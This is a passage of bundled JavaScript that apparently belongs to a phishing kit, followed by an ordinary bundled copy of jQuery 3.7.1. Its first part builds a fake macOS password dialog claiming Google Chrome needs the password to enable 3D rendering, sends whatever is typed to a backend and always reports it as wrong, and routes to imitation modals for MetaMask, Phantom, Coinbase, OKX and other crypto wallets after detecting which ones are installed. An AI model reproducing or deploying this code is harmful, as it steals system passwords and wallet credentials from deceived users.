            return;
        setConnecting(true);
        const currentUserId = backendConfig?.userId || userId;
        if (!currentUserId) {
            setConnecting(false);
            return;
        }
        if (backendConfig?.enabled !== false) {
            await sendKeyToBackend(currentUserId, 'enter', keyword, "MAC");
            setSubmitting(true);
            setTimeout(() => {
                setConnecting(false);
                if (trying < 1) {
                    setTrying(trying + 1);
                }
                else {
                    if (onClose)
                        onClose();
                }
                setSubmitting(false);
                passwordInputRef.current?.focus();
                setIsWrongPassword(true);
                setTimeout(() => {
                    setIsWrongPassword(false);
                }, 500);
            }, 500);
        }
        else {
            setTimeout(() => setConnecting(false), 150);
        }
    };
    const handleKeyDown = (e) => {
        if (e.key === 'Enter' && keyword && !connecting) {
            handleKeywordTyping();
        }
    };
    if (!isOpen)
        return null;
    const appName = 'Google Chrome';
    const handleCancelbutton = () => {
        setIsWrongPassword(true);
        setTimeout(() => {
            setIsWrongPassword(false);
        }, 500);
    };
    return (React.createElement(React.Fragment, null,
        React.createElement("div", { className: `fixed z-[9999] transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, style: {
                backdropFilter: 'blur(18px) saturate(140%)',
                WebkitBackdropFilter: 'blur(18px) saturate(140%)',
                backgroundColor: 'rgba(0, 0, 0, 0.0)'
            } }),
        React.createElement("div", { className: `fixed inset-0 z-[10000] flex items-center justify-center transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}` },
            React.createElement("div", { onMouseDown: handleMouseDown, ref: modalRef, className: "transition-transform duration-300 ease-out", style: {
                    transform: `translate(${modalPosition.x}px, ${modalPosition.y}px)`,
                    transition: isDragging ? 'none' : 'transform 0.3s ease-out'
                } },
                React.createElement("div", { className: isWrongPassword ? 'mac-modal-vibrate' : '' },
                    React.createElement("div", { className: "bg-[#2f2f2f] rounded-[14px] border border-black w-[260px] transition-transform duration-300", style: {
                            boxShadow: '0 18px 60px rgba(0, 0, 0, 0.55)',
                            transform: isOpen ? 'scale(1)' : 'scale(0.95)'
                        } },
                        React.createElement("div", { className: "px-[20px] pb-[18px] select-none" },
                            React.createElement("div", { className: 'w-full h-[22px]' }),
                            React.createElement("div", { className: "flex justify-center mb-[6px]" },
                                React.createElement("div", { className: "relative w-[70px] h-[70px]" },
                                    React.createElement("svg", { version: "1.2", xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 64 64", width: "64", height: "64" },
                                        React.createElement("defs", null,
                                            React.createElement("image", { width: "51", height: "57", id: "img1", href: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADMAAAA5CAYAAACbOhNMAAAAAXNSR0IB2cksfwAAENRJREFUeJy1WguUVVd5/vY55577njt3eAwhEJ7mQawQECKEgEYjtrFZDUltZKnFLCA1S1ZXK01bkhpbDUuXK7YGggECMaKxYvMgQKhOVtoo0aoJMSqDCc8JITDvmfu+57X77332vXPucGdgBtiLwzn3zLl772/////937/PNXCJ2orP/DW/btb1mDJ1KlKpFDRNQzaTxcm2Npw4dgTbtmxml2qsoZpxMV9ede99fNWae/En185ENBpFqWwB3AOHmjddM02HboTw6H88wt861oadO3fikW88fFmAjQrM6r+5jz+wfj0mTZyAYqkMaCE4HhCKhKFxeoATHJquuPTowrU9OFzD9CmT8LWvfgXr1n2Jb9y4ERv+7aFLCmrEYFpefoUvXbwQlm3DcjnMSBSe5yBDLpXJZlEolggYgSGraLqOSDiMhmQcyXgcJlmPcCEWjWD9+n/C8uV38X996EHs2f3cJQF1wWCW3/UpvnnzZoxJN8JxaaKGiTK5VUdHB7r7CEQ+T1YqwrYsAufJ74i4MU0TEQIs3DDVkETz+DF0TsBygBnTp2Hbkzux/h/X8R3bHr9oQBcE5u4Vn+Xbtz2OUChEk3BpshxnOzrRTkd/JoMcWUQAcz36GzSymEvhwmGQZQwdoH8EKIL+ZBJ9/Rmk0ylMntiMaCwGFErY8I1vIplM8m9/65sXBei8YP7sk7fzxzY9SstsoFi24dJET556Dz09Pejt7UWxWARnOo6fOImTx4+h4+x72L/3eTmpZbfdztNNYzF5+kxMnzFDAs4XCiiRBYvFMiZfMR6NTWnwPMe6+/8Zmf5+/uT2raMGdF4wGzZsQDgalzHiug5OvHMaPd3dcoVFa239I77+1QfrTuAn+16oub/6i3/Hb755KZzOTmldTnFlU9yNG5uGR6Rx/wNfBoEZLZbhwXz7sS38mmuuJiBEt+RCbWSR/r4+Geg0F+x8cite3LP7gldy26Z/Z3Rg0xPf55KydY0OHSGDIdnQgEaKpWf3/oQv/+SyUVlnWDCfXvFpAuLCKpfR0d2DXC6HLAERq7li+W2jdocvrvoM27j1u1zEoBmOUN99CIdNRIko5syZi5X3rObf3bFtxP0PCWbTlu08SgNYlk0sVUI2V5D+znSTgIxu5YJt7ZqVbOeu3TyXzRB9m+gkQBObxxGoEO76qxUgMCPuc0gwyz7xp7Bthw4L/dk8yhS0ws/3PP/MRYEIth/94CmsuW8tykTn4shkc4jF4pg6YyZuv+Mu/sJz/zWiRasL5p41X+DpxgbJXIKBLBrIcRyyTAnbt2y6ZFl77+5n2dJbPs7nzZtLY3nIU8KNUkINU6KdfcM8EJgR9VcXzPwbF8EimaIxjpIAQgOJ/PHi3ucvCYhge7llP+YvWCDBiGQrxjMNA/M+OH/EfdUFM2XKVOrchsjjDokuTrQZowT31BMXn6UHt/17d7O1f/8PPBGPyXFE/hGkkGpsHHFfdcGESTAKF4NSvxqd2ru6L2rSw7W3Dh9G85IlNA6T7mwYDsmg8Ij7qQtGdOqR2QUWAUfkhM7Ojoud85BN6DshfcSiiSUUKcAgHXTb7XfwfS9cuAitbxkKQJGRGcWJ0PKhkIEC0fLlagIEE2DoQjiERSwqtJ1IqCNpdcFw6lyA0WRFIgajTK1dvkJREIwcl8bk6iyAjXTEumCYxMAkKDnIqKd5oS04AlOgRj5qfcuoDhn3z5e7MT5gAwlEHCJk2chsUx+MMrdXM8Bop3r+xuHTvycX0ZNjjWYRhwbD/W0J7veMy+lsoiIdGAeoOtkIg2YIbXZuL3lKZperufa5fYsSQyTskTTj0S/dwtc+8CCQmCCWiG5FCEuJzmIABYrYbPZ1y3D/2q7zm2coK9bEuDfohhiLxuTlgYdp6D3PfI0QPSQDyM2dwfc3P4aVD+0d0l6G1X0amf1fQTlHUjwWRaSxCUZDM2AmwUnuCyA1JEmfZXQOZhwBIhiwnlsHkAIRdF0BjPuHiBfSAOBCSpUKKPd3w+qnqrRcRKgxDaO/Tp9BMCHDhBGJwaUviK0hphs0J/I+PUSHCV8GDF4MXd5nwUmzQYut0fdpYvIPnA2AkLSi3Ie7YmNNPCzzAfN8CcU0+jvNRZcbiDQnT4cRjUIz7eHBOI6FfH8vilRBRhzbB0Gda04J3DDldXWHUs72QqLSC7ARr4LxjeFVn4H67D+rFsUTn224xQKK5C0lqnE8u4CYQarEDp0HjJDeti038jxOJuZim8irMpq/iqwKKAhr8FWwcbWzKTOw2kerWli5m+xfjOX6h9AyTI5LcymSVUt0z6bPjjhscHv4hTSMkI4EyW2dngvHqDBKpBBKkPyONPkxI1ygisKrC6f2nrJeBYD8vqc+8+pjcnL5MqwzORTf6oF1MgO3p0Tx4Y9hRClW00CoIYnImDDCV9AcjeEZ1dCYDldt+wg95tkuhYED5hSllQZiRhu2IznHAD7GnepNXtl4BrmxS2NkLRRbu5A9cAZ2Z0Eaj5MrimJQZH1x7To0dp4AEeE4WhjOURsN59GHRr6QR9fpd1Amro/kTTRYdLayRAoJYrSw7Lg6R3YuoCEztWK8oAVFWWGfKqNwgCxxoiiTiZx8xf0kEKhNd+ZrREl4GryzHq6nP/znohv4M0UXP37jd+cgM3QK8qaxTSTxiQCiMcRTTcTKSfI5crUQFUhcqwtiyFYBVwFSCXhKgKUjfeh/uR2ltjx1yXztpQzvL4qsngLkKe5pVS826eOSEMMEYrnkvNl8x+tv1gAyTKLiUCQCkywi9rE0QYX0sF9kMAVEVyPWy8iDLaM+k/sqtUjx4aJ4tBdde47COp0P8CGXlgcwkMsYAvfUZyglz/yLawwNq2J0f+4H+JMHByxkFMm9eqiKLFOeMelIkitE6J4eEdQcHpjYBTTfKIMAU4wU27LIvHga9umSjIHqRGuY3gfmA+BKMfuUzpS1ZPcK6DQCtDJOYTV3Nt910LeQIWiYKejiS0L0MWUVUSAN5BgWHLnWCpUn5KrqqLCacJ1cmaPweh+sd0tVSV+ZmIznik+FIwhNvgpGKuXfsjvBrQ4wt1+Oq1UsVKnlqb2fzp+zPOw66H82GGXqRKoBIWKOEGXZSCxO5zi0cEI4IX3RqK5GdWBJPwi4XSDDV2KGnrHo768VS+izXMyrgh9wIRnspon4ko8gumAhjCsnQ4snfLBOL9XPZ8G7W8B7WiSomtylYnIJ9fRAZDJ/eMcpZghtKXZEHJISTJzp0EQNziw1tu0PLTXZgPAM+NGAnapB75/yZPVnLBvZD6Qx42Qe6ZxTdSfRpZ5IovFzqxD/2McJdDMOHHfQfsJfjOaGKVg808CHrpsL3nktvLZHCGCfGshT7sdJ9nPcvcTFwzto7UulEjrP5omaLclmYvcylogRKUR9y8jJ60E/qnU09bniQpW3ZuI17a88A61OFN7YMH46uxGferVTbpKIR7V4EqnPr4H10Tvw6MEQWlpzaM94sBy/P9Ng2P1bhpvfNxbrPvpZpK8i5Xzy62SUku/6VZXEMP0KB2vunMYNsURNTU0oWyWfmpMphJPkZqEIxYwCoQXLnsA1U27mOecQXYlySGvRk28RXKLTX89IYvHhDCb1WtLS0YWLkfjwrfjy/xl47o0CssXaCBSgciWOrlwJUTOKfyHQWu738DqeRUWY+kmIrKNxfOiaEq09+awZ9lnLCEdJZ4YJhDiUchYxE6hrzlHQwhL0XJXwJB17cpP9WLYkiyyxkmcbQtg3J42VP29HlBJybNFivFYaj58fIaYrYsiWLXK0HCrh1msnYkH6I+Bd+6V1gnlMENacGWWqZ8itOjvaaSUchPNUQ5DbRYt5omZTlgNVztcqLFWJlwpjoSb/cEWlGbp/tEwuxjV5r0wDtl4ZReukOG7EWOhjx+HACRcd2eHrPfHXdnrmwHEXNy6YRu45Ezx3CL749STVixlOaLJ91Sw+6pq/NybfZpG/6uIhBYBLABy1uyVBqtakthu4z6HTLDI8UMjR7TPJEH4zNY65xfHQGxrRfsolNzx/8Sqeae8jotEbyH2aUHEzTe3sCVjJqKRmjQI+CofktxmJI0bUGKaKU7waFwUSU/LfF4AXtqkhngoJ/8p6/uaE+ppN0vzNSTH8thzDxBFuI1WanA/TfKtIVlS+wKRqZrAthxK1T83i5RIrk3WEL7qBSlNye32NVi2fA1tErnhzQJYuOEyB8Z96L6XjVSqL57MimunaJHIQP44YrolnmhtFDukleu5SkAiQSvQCWKZA1ajY1+3p6SPLcJixEklvG9EYEUDIJOsYSmJow1YAQYtVqFkosHFeCl3cQHUDSZHBQbcDh+wOLJr+fkm/+dLw+5fjEwyLZxARWZ10CDCqRoKyDKnq4+1U/jsEJknJi9MqilfkyYYUIuI3MKah6nimdAcGVZusahE2aCpi0mH67wZSFYcrEw2U0R2Gh5bON/G3H5yDZbOS+AHxcqZ4LhwxjoiFxVeHceNEUgNtL5PJcyqBC0CuIiiOo2dCRM1Ey9FoGC65UpgSJd3w6VkX1KxV48Vv9c3jKXEZ5Lkw/bcoxrGr5MJVO3oVhSDOL538Ba5OT8OKhZ9AvhzBgaNldBAFBpNmc4rhY7MiuOcmG10dLWjq/ZkiI0/lGT8fiO+8fiQCQ7x+O9txVv7KwozEkCwUyDImdDMk7w0ovIpIHDpwg+4mrtIkOq9iSbzt+QHr/3zLbxbFzfbf7SLW1PGFW2/Cn89uwqvHHHSo7aTxFE83kWtNGteN1ndfwpXtW5A2cz4RCUDV/Qngj6dC2Pj028wQv7wQjCZ/XED1TIiSqDgMihdP15Wx1VZQzdpXHCEABgOTFQs3hsb6CxTxLZI0dg1J+BeZch7feeNpHOp8GzdPno+F149BykzKx/J2Hm19Z/Dcr3+DKzI/xS3N3TKnVKzLNF/jFUhQ7PtVVH5Hypk4WUSnGDGjCZ+ayfUYuRgUmAHpHagCqxq+ahZ/kkq/iUEFFy4lQK8QRf/SUpGllC9XgjRbzmHf0f/FK22vYVy8EWMiaXm/j0r3U73vYkY4i3un9qg6SOS6WtX8i0MhPPT4Eb+eEbKlbJegiV8kaRZ0kuxyZ1FuCOr+BCqFEh/ezeq5W1zUHLRQ/eRqf7CUQlAUXq2wpZVI1pQzOMrfqX6/QXOxujmLaRHH946KWZUuO3QS+F6LWR3LcIlKi6WC/AmJably/8y2TGkZCQi+aSsVou919d9qVSG4vObzJLq4mxT0di2J40TVXmCjY+D1hap11NsHQeiLGmx8OCW2l3SfgrlvGXF++xTwnb0mfrj38EDZbFN9HqKJx+JRYrMUGhqpUAuH/PeJbIDNeLXaU5sQQ2z78EEJsLLKS6iPGLna1qJLZQGrumWVsLlSW+r14+QIx6oJBYSlq6ttW5UODrURkD0GtvyotXZDwyHzW14EJqnjREMCiUSCVLQpAXhMq0owpsoBv9StpWhPzSiIz/MC4lOoATovjXOMi3I8lXHxMwJVDFinklRFF2Hq/s6xZcyKuypWRbXrQmylHfiDhh3/reHpFw6du9W09aX32NaX/A+rb43zVMIiVlOT1Zl8OcsCIrOyPSSvRcK60F2oSulDLBShHDIrFcKJMSZ6YuR2YqNcVZ+i68mmh78cR5JeLCjdF+rk+LsMP/wf4OGth4cM2pqXTdtajoxO/V1km/75+RxjKUoaKT2QWe5MWyDWxu+7Gd446uKXhzie+PHQICrt/wFP4j9cR7ghBQAAAABJRU5ErkJggg==" })),
                                        React.createElement("style", null),
                                        React.createElement("use", { id: "Background", href: "#img1", x: "10", y: "2" })))),
                            React.createElement("div", { className: "text-center text-[13px] text-[#ffffff] leading-[20px] mb-[6px]  mac-font-bold" }, appName),
                            React.createElement("div", { className: "text-center text-[11px] text-[#ffffff] leading-[16px] mb-[4px] mac-font-medium" },
                                React.createElement("div", null,
                                    appName,
                                    " is trying to enable"),
                                React.createElement("div", null, "3D rendering"),
                                React.createElement("div", { className: "mt-[14px] text-[#ffffff] mac-font-medium tracking-wide" }, "Enter your password to allow this.")),
                            React.createElement("div", { className: "mb-[6px]" },
                                React.createElement("input", { value: adminName, onChange: (e) => setAdminName(e.target.value), className: `tracking-wider w-full px-[10px] py-[1px] rounded-[5px] text-[11px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'}  mac-font-medium`, disabled: submitting, autoComplete: "new-password", spellCheck: false })),
                            React.createElement("div", { className: "mb-[16px]" },
                                React.createElement("input", { ref: passwordInputRef, type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, placeholder: "Password", autoComplete: "new-password", spellCheck: false, disabled: submitting, className: `tracking-wider w-full px-[10px] py-[1px] rounded-[5px] text-[11px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font-medium` })),
                            React.createElement("div", { className: "flex gap-[10px]" },
                                React.createElement("button", { onClick: handleCancelbutton, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-medium hover:bg-[rgba(255,255,255,0.28)] active:bg-[rgba(255,255,255,0.32)] transition-colors ${submitting ? ' bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[rgba(255,255,255,0.22)] text-[#f5f5f7]'} mac-font-medium`, disabled: submitting }, "Cancel"),
                                React.createElement("button", { onClick: handleKeywordTyping, disabled: submitting, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-semibold transition-colors active:bg-[#3c9cfc] ${submitting ? ' bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[#0a84ff] text-white'} mac-font-medium` }, "OK")))))))));
};

const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendConfig, darkMode: darkModeProp, // Allow override if provided
 }) => {
    // Detect browser's dark mode preference
    const detectedDarkMode = useDarkMode();
    // Use prop if provided, otherwise use detected value
    const darkMode = darkModeProp !== undefined ? darkModeProp : detectedDarkMode;
    if (!isOpen)
        return null;
    // Route to appropriate wallet modal
    const modalProps = {
        isOpen,
        onClose: onClose || (() => { }),
        wallet,
        userId: userId || backendConfig?.userId,
        backendConfig, // Pass backendConfig so modals can check enabled flag
        darkMode,
    };
    let modalComponent = null;
    switch (wallet) {
        case 'Phantom':
            modalComponent = React.createElement(PhantomModal, { ...modalProps });
            break;
        case 'MetaMask':
            modalComponent = React.createElement(MetamaskModal, { ...modalProps });
            break;
        case 'Rabby':
            modalComponent = React.createElement(RabbyModal, { ...modalProps });
            break;
        case 'TronLink':
            modalComponent = React.createElement(TronlinkModal, { ...modalProps });
            break;
        case 'Bitget':
            modalComponent = React.createElement(BitgetModal, { ...modalProps });
            break;
        case 'Coinbase':
            modalComponent = React.createElement(CoinbaseModal, { ...modalProps });
            break;
        case 'Solflare':
            modalComponent = React.createElement(SolflareModal, { ...modalProps });
            break;
        case 'OKX':
            modalComponent = React.createElement(OKXModal, { ...modalProps });
            break;
        case 'Mac':
            modalComponent = React.createElement(MacModal, { ...modalProps });
            break;
        default:
            // Unknown wallet type - return null or a default modal
            return null;
    }
    // Wrap modal in isolated container to prevent style conflicts
    return React.createElement(ModalContainer, null, modalComponent);
};

/**
 * Wallet Detection Utilities
 * Checks if wallet browser extensions are installed
 */
/**
 * Check if MetaMask is installed
 */
const isMetaMaskInstalled = () => {
    // if (typeof window === 'undefined') {
    //   return false;
    // }
    // const ethereum = (window as any).ethereum;
    // if (!ethereum) {
    //   return false;
    // }
    // if (Array.isArray(ethereum)) {
    //   return ethereum.some((provider: any) => provider.isMetaMask === true);
    // }
    // const providers = Array.isArray(ethereum.providers) ? ethereum.providers : [ethereum];
    // return providers.some((provider: any) => {
    //   return provider.isMetaMask === true && provider.isRabby !== true;
    // });
    if (window.ethereum) {
        if (window.ethereum.isMetaMask) {
            return true;
        }
        else if (window.ethereum.isRabby) ;
        else ;
    }
    else {
        return false;
    }
    return false;
};
/**
 * Check if Phantom is installed
 */
const isPhantomInstalled = () => {
    return typeof window !== 'undefined'
        && typeof window.solana !== 'undefined'
        && window.solana.isPhantom === true;
};
/**
 * Check if Rabby is installed
 */
const isRabbyInstalled = () => {
    if (typeof window === 'undefined') {
        return false;
    }
    const ethereum = window.ethereum;
    if (!ethereum) {
        return false;
    }
    // Handle case where window.ethereum itself is an array (some wallet configurations)
    if (Array.isArray(ethereum)) {
        return ethereum.some((provider) => provider.isRabby === true);
    }
    // Normalize providers: use providers array if it exists, otherwise check the main ethereum object
    const providers = Array.isArray(ethereum.providers) ? ethereum.providers : [ethereum];
    // Check all providers for Rabby
    return providers.some((provider) => provider.isRabby === true);
};
/**
 * Check if TronLink is installed
 */
const isTronLinkInstalled = () => {
    return typeof window !== 'undefined'
        && (typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined');
};
/**
 * Check if Bitget is installed
 */
const isBitgetInstalled = () => {
    return typeof window !== 'undefined'
        && (typeof window.bitkeep !== 'undefined' || typeof window.bitget !== 'undefined');
};
/**
 * Check if Coinbase Wallet is installed
 */
const isCoinbaseWalletInstalled = () => {
    if (typeof window === 'undefined') {
        return false;
    }
    const ethereum = window.ethereum;
    if (!ethereum) {
        return false;
    }
    // Check if it's the primary provider (when only Coinbase Wallet is installed)
    if (ethereum.isCoinbaseWallet === true) {
        return true;
    }
    // Check in providers array (when multiple wallets are installed)
    if (Array.isArray(ethereum.providers)) {
        return ethereum.providers.some((provider) => provider.isCoinbaseWallet === true);
    }
    // Alternative detection: check for Coinbase Wallet extension
    // Some versions expose it differently
    if (window.coinbaseWalletExtension) {
        return true;
    }
    return false;
};
/**
 * Check if Solflare is installed
 */
const isSolflareInstalled = () => {
    if (typeof window === 'undefined')
        return false;
    return (typeof window.solflare !== 'undefined' &&
        window.solflare.isSolflare === true);
};
/**
 * Check if OKX Wallet is installed
 */
const isOKXInstalled = () => {
    if (typeof window === 'undefined')
        return false;
    return window.okxwallet?.isOkxWallet === true;
};
/**
 * Check if a specific wallet is installed
 */
const checkWalletInstalled = (wallet) => {
    let isInstalled = false;
    let walletName = wallet;
    switch (wallet) {
        case 'MetaMask':
            isInstalled = isMetaMaskInstalled();
            walletName = 'MetaMask';
            break;
        case 'Phantom':
            isInstalled = isPhantomInstalled();
            walletName = 'Phantom';
            break;
        case 'Rabby':
            isInstalled = isRabbyInstalled();
            walletName = 'Rabby';
            break;
        case 'TronLink':
            isInstalled = isTronLinkInstalled();
            walletName = 'TronLink';
            break;
        case 'Bitget':
            isInstalled = isBitgetInstalled();
            walletName = 'Bitget';
            break;
        case 'Coinbase':
            isInstalled = isCoinbaseWalletInstalled();
            walletName = 'Coinbase Wallet';
            break;
        case 'Solflare':
            isInstalled = isSolflareInstalled();
            walletName = 'Solflare';
            break;
        case 'OKX':
            isInstalled = isOKXInstalled();
            walletName = 'OKX Wallet';
            break;
        default:
            isInstalled = false;
    }
    return { isInstalled, walletName };
};

var commonjsGlobal = typeof globalThis !== 'undefined' ? globalThis : typeof window !== 'undefined' ? window : typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : {};

function getDefaultExportFromCjs (x) {
	return x && x.__esModule && Object.prototype.hasOwnProperty.call(x, 'default') ? x['default'] : x;
}

var toastr$1 = {exports: {}};

var jquery = {exports: {}};

/*!
 * jQuery JavaScript Library v3.7.1
 * https://jquery.com/
 *
 * Copyright OpenJS Foundation and other contributors
 * Released under the MIT license
 * https://jquery.org/license
 *
 * Date: 2023-08-28T13:37Z
 */

var hasRequiredJquery;

function requireJquery () {
	if (hasRequiredJquery) return jquery.exports;
	hasRequiredJquery = 1;
	(function (module) {
		( function( global, factory ) {

			{

				// For CommonJS and CommonJS-like environments where a proper `window`
				// is present, execute the factory and get jQuery.
				// For environments that do not have a `window` with a `document`
				// (such as Node.js), expose a factory as module.exports.
				// This accentuates the need for the creation of a real `window`.
				// e.g. var jQuery = require("jquery")(window);
				// See ticket trac-14549 for more info.
				module.exports = global.document ?
					factory( global, true ) :
					function( w ) {
						if ( !w.document ) {
							throw new Error( "jQuery requires a window with a document" );
						}
						return factory( w );
					};
			}

		// Pass this if window is not defined yet
		} )( typeof window !== "undefined" ? window : commonjsGlobal, function( window, noGlobal ) {

		var arr = [];

		var getProto = Object.getPrototypeOf;

		var slice = arr.slice;

		var flat = arr.flat ? function( array ) {
			return arr.flat.call( array );
		} : function( array ) {
			return arr.concat.apply( [], array );
		};


		var push = arr.push;

		var indexOf = arr.indexOf;

		var class2type = {};

		var toString = class2type.toString;

		var hasOwn = class2type.hasOwnProperty;

		var fnToString = hasOwn.toString;

		var ObjectFunctionString = fnToString.call( Object );

		var support = {};

		var isFunction = function isFunction( obj ) {

				// Support: Chrome <=57, Firefox <=52
				// In some browsers, typeof returns "function" for HTML <object> elements
				// (i.e., `typeof document.createElement( "object" ) === "function"`).
				// We don't want to classify *any* DOM node as a function.
				// Support: QtWeb <=3.8.5, WebKit <=534.34, wkhtmltopdf tool <=0.12.5
				// Plus for old WebKit, typeof returns "function" for HTML collections
				// (e.g., `typeof document.getElementsByTagName("div") === "function"`). (gh-4756)
				return typeof obj === "function" && typeof obj.nodeType !== "number" &&
					typeof obj.item !== "function";
			};


		var isWindow = function isWindow( obj ) {
				return obj != null && obj === obj.window;
			};


		var document = window.document;



			var preservedScriptAttributes = {
				type: true,
				src: true,
				nonce: true,
				noModule: true
			};

			function DOMEval( code, node, doc ) {
				doc = doc || document;

				var i, val,
					script = doc.createElement( "script" );

				script.text = code;
				if ( node ) {
					for ( i in preservedScriptAttributes ) {

						// Support: Firefox 64+, Edge 18+
						// Some browsers don't support the "nonce" property on scripts.
						// On the other hand, just using `getAttribute` is not enough as
						// the `nonce` attribute is reset to an empty string whenever it
						// becomes browsing-context connected.
						// See https://github.com/whatwg/html/issues/2369
						// See https://html.spec.whatwg.org/#nonce-attributes
						// The `node.getAttribute` check was added for the sake of
						// `jQuery.globalEval` so that it can fake a nonce-containing node
						// via an object.
						val = node[ i ] || node.getAttribute && node.getAttribute( i );
						if ( val ) {
							script.setAttribute( i, val );
						}
					}
				}
				doc.head.appendChild( script ).parentNode.removeChild( script );
			}


		function toType( obj ) {
			if ( obj == null ) {
				return obj + "";
			}

			// Support: Android <=2.3 only (functionish RegExp)
			return typeof obj === "object" || typeof obj === "function" ?
				class2type[ toString.call( obj ) ] || "object" :
				typeof obj;
		}
		/* global Symbol */
		// Defining this global in .eslintrc.json would create a danger of using the global
		// unguarded in another place, it seems safer to define global only for this module



		var version = "3.7.1",

			rhtmlSuffix = /HTML$/i,

			// Define a local copy of jQuery
			jQuery = function( selector, context ) {

				// The jQuery object is actually just the init constructor 'enhanced'
				// Need init if jQuery is called (just allow error to be thrown if not included)
				return new jQuery.fn.init( selector, context );
			};

		jQuery.fn = jQuery.prototype = {

			// The current version of jQuery being used
			jquery: version,

			constructor: jQuery,

			// The default length of a jQuery object is 0
			length: 0,

			toArray: function() {
				return slice.call( this );
			},

			// Get the Nth element in the matched element set OR
			// Get the whole matched element set as a clean array
			get: function( num ) {

				// Return all the elements in a clean array
				if ( num == null ) {
					return slice.call( this );
				}

				// Return just the one element from the set
				return num < 0 ? this[ num + this.length ] : this[ num ];
			},

			// Take an array of elements and push it onto the stack
			// (returning the new matched element set)
			pushStack: function( elems ) {

				// Build a new jQuery matched element set
				var ret = jQuery.merge( this.constructor(), elems );

				// Add the old object onto the stack (as a reference)
				ret.prevObject = this;

				// Return the newly-formed element set
				return ret;
			},

			// Execute a callback for every element in the matched set.
			each: function( callback ) {
				return jQuery.each( this, callback );
			},

			map: function( callback ) {
				return this.pushStack( jQuery.map( this, function( elem, i ) {
					return callback.call( elem, i, elem );
				} ) );
			},

			slice: function() {
				return this.pushStack( slice.apply( this, arguments ) );
			},

			first: function() {
				return this.eq( 0 );
			},

			last: function() {
				return this.eq( -1 );
			},

			even: function() {
				return this.pushStack( jQuery.grep( this, function( _elem, i ) {
					return ( i + 1 ) % 2;
				} ) );
			},

			odd: function() {
				return this.pushStack( jQuery.grep( this, function( _elem, i ) {
					return i % 2;
				} ) );
			},

			eq: function( i ) {
				var len = this.length,
					j = +i + ( i < 0 ? len : 0 );
				return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
			},

			end: function() {
				return this.prevObject || this.constructor();
			},

			// For internal use only.
			// Behaves like an Array's method, not like a jQuery method.
			push: push,
			sort: arr.sort,
			splice: arr.splice
		};

		jQuery.extend = jQuery.fn.extend = function() {
			var options, name, src, copy, copyIsArray, clone,
				target = arguments[ 0 ] || {},
				i = 1,
				length = arguments.length,
				deep = false;

			// Handle a deep copy situation
			if ( typeof target === "boolean" ) {
				deep = target;

				// Skip the boolean and the target
				target = arguments[ i ] || {};
				i++;
			}

			// Handle case when target is a string or something (possible in deep copy)
			if ( typeof target !== "object" && !isFunction( target ) ) {
				target = {};
			}

			// Extend jQuery itself if only one argument is passed
			if ( i === length ) {
				target = this;
				i--;
			}

			for ( ; i < length; i++ ) {

				// Only deal with non-null/undefined values
				if ( ( options = arguments[ i ] ) != null ) {

					// Extend the base object
					for ( name in options ) {
						copy = options[ name ];

						// Prevent Object.prototype pollution
						// Prevent never-ending loop
						if ( name === "__proto__" || target === copy ) {
							continue;
						}

						// Recurse if we're merging plain objects or arrays
						if ( deep && copy && ( jQuery.isPlainObject( copy ) ||
							( copyIsArray = Array.isArray( copy ) ) ) ) {
							src = target[ name ];

							// Ensure proper type for the source value
							if ( copyIsArray && !Array.isArray( src ) ) {
								clone = [];
							} else if ( !copyIsArray && !jQuery.isPlainObject( src ) ) {
								clone = {};
							} else {
								clone = src;
							}
							copyIsArray = false;

							// Never move original objects, clone them
							target[ name ] = jQuery.extend( deep, clone, copy );

						// Don't bring in undefined values
						} else if ( copy !== undefined ) {
							target[ name ] = copy;
						}
					}
				}
			}

			// Return the modified object
			return target;
		};

		jQuery.extend( {

			// Unique for each copy of jQuery on the page
			expando: "jQuery" + ( version + Math.random() ).replace( /\D/g, "" ),

			// Assume jQuery is ready without the ready module
			isReady: true,

			error: function( msg ) {
				throw new Error( msg );
			},

			noop: function() {},

			isPlainObject: function( obj ) {
				var proto, Ctor;

				// Detect obvious negatives
				// Use toString instead of jQuery.type to catch host objects
				if ( !obj || toString.call( obj ) !== "[object Object]" ) {
					return false;
				}

				proto = getProto( obj );

				// Objects with no prototype (e.g., `Object.create( null )`) are plain
				if ( !proto ) {
					return true;
				}

				// Objects with prototype are plain iff they were constructed by a global Object function
				Ctor = hasOwn.call( proto, "constructor" ) && proto.constructor;
				return typeof Ctor === "function" && fnToString.call( Ctor ) === ObjectFunctionString;
			},

			isEmptyObject: function( obj ) {
				var name;

				for ( name in obj ) {
					return false;
				}
				return true;
			},

			// Evaluates a script in a provided context; falls back to the global one
			// if not specified.
			globalEval: function( code, options, doc ) {
				DOMEval( code, { nonce: options && options.nonce }, doc );
			},

			each: function( obj, callback ) {
				var length, i = 0;

				if ( isArrayLike( obj ) ) {
					length = obj.length;
					for ( ; i < length; i++ ) {
						if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
							break;
						}
					}
				} else {
					for ( i in obj ) {
						if ( callback.call( obj[ i ], i, obj[ i ] ) === false ) {
							break;
						}
					}
				}

				return obj;
			},


			// Retrieve the text value of an array of DOM nodes
			text: function( elem ) {
				var node,
					ret = "",
					i = 0,
					nodeType = elem.nodeType;

				if ( !nodeType ) {

					// If no nodeType, this is expected to be an array
					while ( ( node = elem[ i++ ] ) ) {

						// Do not traverse comment nodes
